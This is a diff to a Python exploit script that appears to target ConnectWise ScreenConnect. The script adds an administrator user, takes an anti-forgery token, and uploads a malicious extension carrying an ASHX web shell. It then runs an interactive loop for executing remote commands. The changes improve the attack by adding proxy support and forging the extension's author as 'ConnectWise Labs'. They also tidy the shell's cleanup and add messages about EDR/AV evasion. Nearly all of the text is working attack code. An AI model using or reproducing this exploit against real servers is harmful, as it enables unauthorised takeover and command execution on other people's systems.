@@ -1,6 +1,7 @@
 import argparse
 import base64
 import re
+import sys
 import warnings
 from distutils.version import LooseVersion
 import requests
@@ -9,14 +10,14 @@ import string
 import zipfile
 import urllib3
 
+DELETE_STATUS=False
 warnings.filterwarnings("ignore", category=DeprecationWarning)
 urllib3.disable_warnings()
 
 exploit_header = {
     "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36"
 }
-# proxy = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}
-proxy = {}
+
 GREEN = "\033[92m"
 RESET = "\033[0m"
 def rand_text_hex(length):
@@ -82,8 +83,9 @@ public class {payload_handler_class} : IHttpHandler
 <ExtensionManifest>
   <Version>1</Version>
   <Name>{rand_text_alpha_lower(8)}</Name>
-  <Author>{rand_text_alpha_lower(8)}</Author>
+  <Author>ConnectWise Labs</Author>
   <ShortDescription>{rand_text_alpha_lower(8)}</ShortDescription>
+  <AuthorKey>null</AuthorKey>
   <Components>
     <WebServiceReference SourceFile="{payload_ashx}"/>
   </Components>
@@ -94,7 +96,7 @@ public class {payload_handler_class} : IHttpHandler
     zip_resources.close()
 
 def UploadExtension(url, anti_forgery_token):
-    with open('resources.zip', 'rb') as f:
+    with open("resources.zip", "rb") as f:
         zip_data = f.read()
     zip_data_base64 = base64.b64encode(zip_data).decode()
     headers = {
@@ -103,6 +105,8 @@ def UploadExtension(url, anti_forgery_token):
         "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36"
     }
     url = url + "/Services/ExtensionService.ashx/InstallExtension"
+    session.cookies.update({"settings": "%7B%22collapsedPanelMap%22%3A%7B%22Inactive%22%3Atrue%7D%7D"})
+    print(session.cookies.get_dict())
     try:
         response = session.post(url=url, data=f"[\"{zip_data_base64}\"]", headers=headers, verify=False, proxies=proxy)
         if response.status_code == 200:
@@ -114,39 +118,44 @@ def UploadExtension(url, anti_forgery_token):
 
 def ExecuteCommand(url):
     try:
-        resp = session.get(url=url + f"/App_Extensions/{plugin_guid}/{payload_ashx}", verify=False, proxies=proxy)
-        print(f"[+] Shell Url: {url + f'/App_Extensions/{plugin_guid}/{payload_ashx}'}")
+        resp = session.get(url=url + f"/App_Extensions/{plugin_guid}/{payload_ashx}", headers=exploit_header, verify=False, proxies=proxy)
         if resp.status_code == 200:
+            print(f"[+] Shell Url: {url + f'/App_Extensions/{plugin_guid}/{payload_ashx}'}")
             print("[+] Please start executing commands freely! Type <quit> to delete the shell")
             while True:
-                cmd = input("command > ")
+                cmd = input(f"{GREEN}command > {RESET}")
                 if cmd == "quit":
                     DeleteExtension(target, plugin_guid)
+                    sys.exit(0)
                 try:
-                    resp = session.get(url=url + f"/App_Extensions/{plugin_guid}/{payload_ashx}?cmd={cmd}", verify=False, proxies=proxy)
+                    resp = session.get(url=url + f"/App_Extensions/{plugin_guid}/{payload_ashx}?cmd={cmd}", headers=exploit_header, verify=False, proxies=proxy)
                     print(resp.text)
                 except Exception as err:
                     print("[-] Error in func <ExecuteCommand>, error message: " + str(err))
         else:
-            print("failed")
+            print(f"[-] Malicious extension upload failed ({url + f'/App_Extensions/{plugin_guid}/{payload_ashx}'}), the target may have EDR/AV! Please upload ashx webshell yourself!")
+            DeleteExtension(target, plugin_guid)
     except Exception as err:
         print("[-] Error in func <ExecuteCommand>, error message: " + str(err))
 
 def DeleteExtension(url, plugin_guid):
-    try:
-        headers = {
-            "X-Anti-Forgery-Token": anti_forgery_token,
-            "Content-Type": "application/json",
-            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36"
-        }
-        url = url + "/Services/ExtensionService.ashx/UninstallExtension"
-        response = session.post(url=url, data=f"[\"{plugin_guid}\"]", headers=headers, verify=False, proxies=proxy)
-        if response.status_code == 200:
-            print(f"[+] The malicious extension was removed successfully, with the ID: {plugin_guid}")
-        else:
-            print("[-] Malicious extension removed failed, please check the network and try again or try to exploit manually")
-    except Exception as err:
-        print("[-] Error in func <DeleteExtension>, error message: " + str(err))
+    global DELETE_STATUS
+    if not DELETE_STATUS:
+        try:
+            headers = {
+                "X-Anti-Forgery-Token": anti_forgery_token,
+                "Content-Type": "application/json",
+                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36"
+            }
+            url = url + "/Services/ExtensionService.ashx/UninstallExtension"
+            response = session.post(url=url, data=f"[\"{plugin_guid}\"]", headers=headers, verify=False, proxies=proxy)
+            if response.status_code == 200:
+                print(f"[+] The malicious extension was removed successfully, with the ID: {plugin_guid}")
+                DELETE_STATUS = True
+            else:
+                print("[-] Malicious extension removed failed, please check the network and try again or try to exploit manually")
+        except Exception as err:
+            print("[-] Error in func <DeleteExtension>, error message: " + str(err))
 
 def AddUser(url, username, password, domain):
     if CheckVersion(url):
@@ -210,6 +219,7 @@ def ParseArguments():
     parser.add_argument("-p", "--password", type=str, default="cvetest@2023", help="password you want to add", required=False)
     parser.add_argument("-t", "--target", type=str, default="http://1.2.3.4", help="target url", required=True)
     parser.add_argument("-d", "--domain", type=str, default="poc.com", help="Description of domain", required=False)
+    parser.add_argument("-p", "--proxy", type=str, help="eg: http://127.0.0.1:8080", required=False)
     return parser.parse_args()
 
 if __name__ == "__main__":
@@ -218,15 +228,19 @@ if __name__ == "__main__":
     password = args.password
     target = args.target
     domain = args.domain
+    if args.proxy:
+        proxy = {"http": args.proxy, "https": args.proxy}
+    else:
+        proxy = {}
     AddUser(target, username, password, domain)
     anti_forgery_token = GetAntiForgeryToken(target, username, password)
     CreateExtension()
     if anti_forgery_token is not None:
-        print("[+] AntiForgeryToken successfully obtained!")
+        print(f"[+] X-Anti-Forgery-Token successfully obtained: {anti_forgery_token}")
         UploadExtension(target, anti_forgery_token)
     else:
         print("[-] AntiForgeryToken acquisition failed, please check the network and try again or try to exploit manually")
     try:
         ExecuteCommand(target)
-    except:
+    except Exception as e:
         DeleteExtension(target, plugin_guid)
